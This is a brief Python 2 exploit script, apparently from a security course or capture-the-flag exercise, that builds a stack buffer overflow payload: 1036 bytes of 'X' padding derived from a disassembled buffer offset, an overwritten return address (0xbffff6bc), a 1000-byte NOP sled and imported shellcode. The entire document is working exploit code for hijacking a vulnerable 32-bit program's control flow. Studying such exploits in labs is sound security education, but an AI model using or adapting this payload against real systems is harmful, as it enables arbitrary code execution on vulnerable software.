from shellcode import shellcode
from struct import pack

pad = 0xbffff6bc  # main EBP 0xbffff038 + 20 byte pad

#  disassemble vulnerable : lea    -0x408(%ebp),%eax
# 0x408 in Hex = 1032 in Dec.
# 1032 + 4 for ret = 1036

print 'X'*1036 + pack("<I",pad) + "\x90"*1000 + shellcode
